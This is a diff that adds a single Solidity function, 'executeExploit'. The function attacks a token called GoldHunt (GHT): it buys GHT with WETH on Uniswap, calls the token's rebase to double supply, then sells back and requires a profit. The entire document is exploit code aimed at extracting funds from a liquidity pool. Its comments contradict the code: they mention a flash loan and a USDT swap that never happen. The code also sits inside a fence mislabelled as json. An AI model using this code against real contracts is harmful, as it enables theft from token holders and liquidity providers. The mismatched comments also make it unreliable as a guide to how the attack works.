@@ -1,0 +1,46 @@
+```json
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Get WETH from flash loan and confirm balance
+    IWETH(uniswapRouter.WETH()).deposit{ value: amount }();
+    require(IWETH(uniswapRouter.WETH()).balanceOf(address(this)) >= amount, "Failed to deposit WETH");
+
+    // Step 2: Swap WETH for the GHT token using Uniswap
+    address[] memory path = new address[](2);
+    path[0] = uniswapRouter.WETH();
+    path[1] = token;
+
+    uint[] memory amounts = uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        0,
+        path,
+        address(this),
+        block.timestamp + 300
+    );
+
+    // Step 3: Calculate the profit opportunity from GHT tokens
+    uint256 ghtAmount = amounts[1];
+
+    // Step 4: Recreate the scenario with the GHT and initiate a rebase
+    IGoldHunt(token).rebase(2); // Double the minted GHT in total supply
+    
+    // Step 5: Approve GHT for exchange to USDT
+    IERC20(token).approve(address(uniswapRouter), ghtAmount);
+
+    // Step 6: Now swap the GHT tokens back for WETH
+    path[0] = token;
+    path[1] = uniswapRouter.WETH();
+    
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        ghtAmount,
+        0,
+        path,
+        address(this),
+        block.timestamp + 300
+    );
+    
+    // Step 7: Confirm that we have more WETH than we started
+    require(IWETH(uniswapRouter.WETH()).balanceOf(address(this)) > amount, "No profit made");
+}
+</executeExploitCode>
+```
